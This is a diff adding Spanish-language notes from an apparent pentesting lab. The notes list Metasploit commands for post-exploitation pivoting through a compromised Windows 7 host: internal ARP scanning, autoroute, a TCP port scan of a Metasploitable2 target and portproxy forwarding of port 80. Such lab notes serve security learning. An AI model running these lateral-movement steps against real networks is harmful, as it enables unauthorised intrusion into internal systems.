@@ -124,5 +124,45 @@ Para ver las sesiones en segundo plano.
 sessions -l
 ```
 
-Módulo de metasploit para encontrar equipos de la Red Interna.
+Módulo de Metasploit para encontrar equipos de la Red Interna.
 
+```bash
+use windows/gather/arp_scanner
+show options
+set SESSION 1
+set RHOSTS <IP máquina víctima>/24 #Rango de las IPs por eso el 24
+run
+```
+
+Nos encuentra las distintas IPs de nuestra Red Interna. Ahora quiero que me envíe el tráfico desde la máquina víctima Windows a la máquina víctima objetivo Metasploitable2 para que llegue a mi Kali.
+
+```bash
+use multi/manage/autoroute
+show options
+set SESSION 1
+run
+```
+
+Ya tenemos el tráfico enrutado. Hacer escaneo de los puertos abiertos de la máquina víctima.
+
+```bash
+use scanner/portscan/tcp
+show options
+set RHOSTS <IP máquina víctima>
+run
+```
+
+Vemos los puertos abiertos es hacer **`nmap`** pero con **Metasploit**. En caso de hacer el Pivoting en Windows realizamos lo siguiente.
+
+```bash
+use post/windows/manage/portproxy
+show options
+set CONNECT_ADDRESS <IP máquina víctima> 
+set CONNECT_PORT 80  # Puerto al que queremos acceder
+set LOCAL_ADDRESS 0.0.0.0  # Siempre debe ser 0.0.0.0
+set LOCAL_PORT 5000  # Puerto local para redirigir el tráfico del puerto objetivo
+set SESSION 1  # ID de la sesión de Meterpreter de la máquina Windows
+run
+```
+
+Abrimos el navegador con la IP de la máquina Windows 7 con el puerto 5000 porque es donde me he traído el puerto 80.
